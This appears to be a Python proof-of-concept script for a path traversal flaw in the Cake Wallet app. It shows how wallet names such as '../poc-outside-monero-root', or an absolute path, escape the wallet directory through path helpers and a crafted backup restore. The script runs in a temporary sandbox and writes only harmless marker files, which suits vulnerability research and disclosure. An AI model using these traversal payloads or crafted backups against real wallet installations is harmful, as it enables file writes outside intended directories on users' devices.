#!/usr/bin/env python3
"""
Cake Wallet wallet-name path traversal PoC.

Mirrors pre-patch `cw_core/lib/pathForWallet.dart` exactly:
  pathForWalletTypeDir: wallets/<prefix>/ + createSync(recursive:true)
  pathForWalletDir:     '${typeRoot}/$name' + createSync(recursive:true)
  pathForWallet:        pathForWalletDir + '/$name'
  copyWalletFilesTo:    p.join(typeRoot, fromName/toName) (p.join discards
                        root when second arg is absolute)

Also mirrors the trust boundary documented in cakewallet-source-review.md:
  - lib/core/wallet_name_validator.dart  -> ^[a-zA-Z0-9\\-_ ]+$ , 1..33
    (enforced on create/restore/rename UI forms only)
  - lib/core/backup_service.dart verifyWallets() -> filters only by
    availableWalletTypes, no name check
  - cw_core/lib/wallet_info.dart WalletInfo.fromJson() -> takes name as-is
  - lib/core/backup_service.dart importPreferencesDump() -> restores
    currentWalletName/currentWalletType as-is
  - lib/entities/load_current_wallet.dart + lib/core/wallet_loading_service.dart
    load(type,name) -> walletService.openWallet(name) -> pathForWallet(name)
    with no re-validation.

Archive extraction itself IS guarded on current upstream
(`$BackupService.safeExtractPath` in backup_service.dart:54 and V3:313),
so this PoC does not claim zip-slip. The gap is wallet-name -> filesystem.

Run:
  python poc.py
  python poc.py --fire   # also writes C:\\Users\\Public\\cakewallet-traversal-poc.txt

All filesystem mutations default to a fresh temp sandbox which is deleted
on exit. --fire adds one harmless marker in Public, matching the convention
of the other PoCs in this workspace (atlauncher, obs).
Exit 0 = VULNERABLE reproduced. Exit 1 = not reproduced (patched).
Stdlib only.
"""
import argparse
import os
import re
import shutil
import sys
import tempfile

# --------------------------------------------------------------------------
# Replicas of production code
# --------------------------------------------------------------------------

# lib/core/wallet_name_validator.dart:4
#   pattern: '^[a-zA-Z0-9\\-_ ]+$', minLength 1, maxLength 33
_VALID_RE = re.compile(r'^[a-zA-Z0-9\-_ ]+$')

def wallet_name_validator(name: str) -> bool:
    return 1 <= len(name) <= 33 and bool(_VALID_RE.match(name))

def is_within(parent: str, candidate: str) -> bool:
    """Containment check the patched code should have (cf. safeExtractPath)."""
    parent_c = os.path.normcase(os.path.normpath(os.path.abspath(parent)))
    cand_c = os.path.normcase(os.path.normpath(os.path.abspath(candidate)))
    try:
        common = os.path.commonpath([parent_c, cand_c])
    except ValueError:
        return False
    return common == parent_c

def safe_extract_path(base_dir: str, entry_name: str):
    """Replica of $BackupService.safeExtractPath (backup_service.dart:54)."""
    if not entry_name or os.path.isabs(entry_name):
        return None
    # Dart `archive` flags symlinks via File.isSymbolicLink; zip names
    # ending in '/' are dirs. Rejecting NUL/absolute here is enough for parity.
    root = os.path.normpath(os.path.abspath(base_dir))
    target = os.path.normpath(os.path.join(root, entry_name))
    return target if is_within(root, target) else None

# cw_core/lib/pathForWallet.dart:7-18
def vulnerable_path_for_wallet_type_dir(app_dir: str, prefix: str = "monero") -> str:
    wallets_dir = os.path.join(app_dir, "wallets")
    wallet_dir = os.path.join(wallets_dir, prefix)
    os.makedirs(wallet_dir, exist_ok=True)
    return wallet_dir

# cw_core/lib/pathForWallet.dart:20-29
#   final walletDire = Directory('${typeRoot}/$name');
#   if (!exists) walletDire.createSync(recursive: true);
def vulnerable_path_for_wallet_dir(type_root: str, name: str) -> str:
    wallet_dir = f"{type_root}/{name}"  # exact Dart interpolation, no normalize
    if not os.path.exists(wallet_dir):
        os.makedirs(wallet_dir, exist_ok=True)  # recursive:true normalizes `..`
    return wallet_dir

# cw_core/lib/pathForWallet.dart:31-32
def vulnerable_path_for_wallet(type_root: str, name: str) -> str:
    d = vulnerable_path_for_wallet_dir(type_root, name)
    return d + f"/{name}"

# cw_core/lib/pathForWallet.dart:41-67 (join semantics matter)
# Dart `package:path` p.join(a,b): if b is absolute, a is discarded.
# Python os.path.join behaves identically on Windows and POSIX.
def vulnerable_copy_target(type_root: str, to_name: str) -> str:
    return os.path.join(type_root, to_name)

# lib/core/backup_service.dart:146-155
AVAILABLE_WALLET_TYPES = {"monero", "bitcoin", "ethereum", "litecoin"}

def verify_wallets_replica(wallet_infos):
    """Replica: filters only by supported type, no name validation."""
    return [w for w in wallet_infos if w.get("type") in AVAILABLE_WALLET_TYPES]

# --------------------------------------------------------------------------
# PoC
# --------------------------------------------------------------------------

PUBLIC_MARKER = r"C:\Users\Public\cakewallet-traversal-poc.txt"

def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--fire", action="store_true",
                    help="also drop harmless marker in C:\\Users\\Public")
    args = ap.parse_args()

    sandbox = tempfile.mkdtemp(prefix="cake-wallet-name-poc-")
    print(f"[*] sandbox: {sandbox}")
    try:
        app_dir = os.path.join(sandbox, "app")
        os.makedirs(app_dir, exist_ok=True)
        type_root = vulnerable_path_for_wallet_type_dir(app_dir, "monero")
        print(f"[*] type_root (wallets/monero): {type_root}")
        canon_type_root = os.path.realpath(type_root)

        failures = []

        # ---- Case 1: UI validator vs core helper -------------------------
        evil_dir_name = "../poc-outside-monero-root"
        print(f"\n[Case 1] wallet name: {evil_dir_name!r}")
        print(f"  UI WalletNameValidator would accept? {wallet_name_validator(evil_dir_name)}"
              f"  (expected False -> blocked on normal create/rename forms)")
        derived = vulnerable_path_for_wallet_dir(type_root, evil_dir_name)
        canon_derived = os.path.realpath(derived)
        contained = is_within(canon_type_root, canon_derived)
        print(f"  derived dir (raw): {derived}")
        print(f"  derived dir (canon): {canon_derived}")
        print(f"  contained in monero root? {contained}")
        if contained:
            print("  [-] NOT REPRODUCED: stayed contained")
            failures.append("case1")
        else:
            print("  [+] VULNERABLE: directory created OUTSIDE monero type root")
            # prove arbitrary-file-write primitive inside sandbox
            marker = os.path.join(canon_derived, "marker.txt")
            with open(marker, "w") as f:
                f.write("cake-wallet wallet-name traversal poc\n")
            print(f"  [+] wrote file outside type root: {marker}")

        # ---- Case 2: pathForWallet file escapes ---------------------------
        evil_file_name = "../../poc-outside-wallets"
        print(f"\n[Case 2] wallet name (file path): {evil_file_name!r}")
        fpath = vulnerable_path_for_wallet(type_root, evil_file_name)
        canon_fpath = os.path.normpath(os.path.abspath(fpath))
        in_type = is_within(canon_type_root, canon_fpath)
        in_wallets = is_within(os.path.realpath(os.path.join(app_dir, "wallets")), canon_fpath)
        print(f"  derived file (raw): {fpath}")
        print(f"  derived file (canon): {canon_fpath}")
        print(f"  contained in monero root? {in_type}")
        print(f"  contained even in wallets/? {in_wallets}")
        if not in_type:
            print("  [+] VULNERABLE: wallet file path escapes monero root"
                  + (", escapes wallets/ entirely" if not in_wallets else ""))
        else:
            print("  [-] NOT REPRODUCED")
            failures.append("case2")
        # actual write for the parent dir (makedirs already created it)
        with open(canon_fpath + ".txt", "w") as f:
            f.write("poc file write outside type root\n")
        print(f"  [+] wrote: {canon_fpath}.txt")

        # ---- Case 3: rename/copy helper, incl. absolute second arg --------
        print("\n[Case 3] copyWalletFilesTo / rename sink (p.join semantics)")
        # 3a: traversal toName
        to_traversal = "../poc-rename-escape"
        target = vulnerable_copy_target(type_root, to_traversal)
        print(f"  toName={to_traversal!r} -> target={target}")
        print(f"  contained? {is_within(canon_type_root, os.path.realpath(target))}")
        os.makedirs(target, exist_ok=True)
        if not is_within(canon_type_root, os.path.realpath(target)):
            print("  [+] VULNERABLE: rename/copy destination escapes type root")
        else:
            failures.append("case3a")
        # 3b: absolute toName discards type_root entirely (Dart+Python join)
        abs_evil = os.path.join(sandbox, "abs-evil-target")
        target_abs = vulnerable_copy_target(type_root, abs_evil)
        print(f"  toName={abs_evil!r} (absolute) -> target={target_abs}")
        print(f"  join discarded type_root? {os.path.abspath(target_abs) == os.path.abspath(abs_evil)}")
        os.makedirs(target_abs, exist_ok=True)
        if os.path.abspath(target_abs) == os.path.abspath(abs_evil):
            print("  [+] VULNERABLE: absolute wallet name bypasses type root completely")
        else:
            failures.append("case3b")

        # ---- Case 4: backup-restore trust boundary -------------------------
        print("\n[Case 4] backup restore -> verifyWallets -> prefs -> load() flow")
        crafted_infos = [
            {"name": "../poc-restore-escape", "type": "monero"},  # attacker name in DB dump
            {"name": "legit-wallet", "type": "monero"},
        ]
        kept = verify_wallets_replica(crafted_infos)
        print(f"  verifyWallets keeps: {[w['name'] for w in kept]}")
        print("  (production verifyWallets filters ONLY by type, no name check)")
        bypass = any(w["name"] == "../poc-restore-escape" for w in kept)
        # preferences dump restores currentWalletName verbatim
        prefs_dump = {"currentWalletName": "../poc-restore-escape", "currentWalletType": 0}
        print(f"  importPreferencesDump restores as-is: {prefs_dump['currentWalletName']!r}")
        print("  loadCurrentWallet -> WalletLoadingService.load(type,name) ->"
              " openWallet(name) -> pathForWallet(name): no re-validation")
        restored_dir = vulnerable_path_for_wallet_dir(type_root, prefs_dump["currentWalletName"])
        restored_contained = is_within(canon_type_root, os.path.realpath(restored_dir))
        print(f"  restored wallet dir: {os.path.realpath(restored_dir)}")
        print(f"  contained? {restored_contained}")
        if bypass and not restored_contained:
            print("  [+] VULNERABLE: crafted backup name survives verify+prefs and escapes on load")
        else:
            print("  [-] NOT REPRODUCED")
            failures.append("case4")

        # ---- Contrast: archive guard (already fixed upstream) --------------
        print("\n[Contrast] archive safeExtractPath (already fixed, should BLOCK)")
        blocked = 0
        for entry in ["../../evil.txt", "/etc/passwd", "", "wallets/monero/ok.txt"]:
            r = safe_extract_path(app_dir, entry)
            verdict = "BLOCKED" if r is None else f"allowed -> {r}"
            print(f"  entry {entry!r}: {verdict}")
            if r is None and entry != "wallets/monero/ok.txt":
                blocked += 1
        print(f"  malicious entries blocked: {blocked}/3 (expected 3)")

        print("\n================ RESULT ================")
        if failures:
            print(f"NOT REPRODUCED ({failures}). Patched or environment issue.")
            return 1
        print("VULNERABLE: wallet-name containment check failed.")
        print("UI validator rejects `..`, but pathForWalletDir / copyWalletFilesTo /")
        print("verifyWallets + WalletInfo.fromJson + importPreferencesDump + load()")
        print("accept it and create/write outside the per-type wallet directory.")
        if args.fire:
            with open(PUBLIC_MARKER, "w") as f:
                f.write("cake-wallet wallet-name traversal PoC fired\n"
                        f"sandbox={sandbox}\n")
            print(f"[+] --fire marker written: {PUBLIC_MARKER}")
        else:
            print("(sandbox only; re-run with --fire to drop Public marker)")
        return 0
    finally:
        if os.path.isdir(sandbox):
            shutil.rmtree(sandbox, ignore_errors=True)
            print(f"[*] sandbox cleaned: {sandbox}")

if __name__ == "__main__":
    sys.exit(main())
